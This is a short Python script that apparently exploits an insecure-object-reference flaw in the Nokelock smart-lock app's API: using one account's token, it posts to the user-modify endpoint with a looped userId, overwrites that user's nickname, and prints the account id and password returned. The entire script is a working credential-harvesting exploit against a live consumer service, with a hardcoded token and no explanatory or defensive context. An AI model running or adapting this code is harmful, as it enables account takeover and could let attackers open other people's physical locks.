import requests
import json
owntoken='e5bd0c7fabf44a38a58b09174449c12f'
url = "https://app.nokelock.com/nokelock_v3/user/modify"
strheader ={"token":owntoken,
            "User-Agent":"nokelock/5.3.2(Android 8.1.0 ; LGE/Nexus 5X)",
            "clientType":"Android",
            "uid":"273473",}
for userid in range(273473,273474):
    print(userid)
    strdata = {"nickName":"ssff","userId":userid}
    jsondata = json.dumps(strdata)
    request = requests.post(url,data=jsondata,headers=strheader)
    respdata = request.text
    jsonresp = json.loads(respdata)
    account = jsonresp['result']['userId']
    accpawd = jsonresp['result']['password']
    print("account is:"+account+",account password is:"+accpawd)

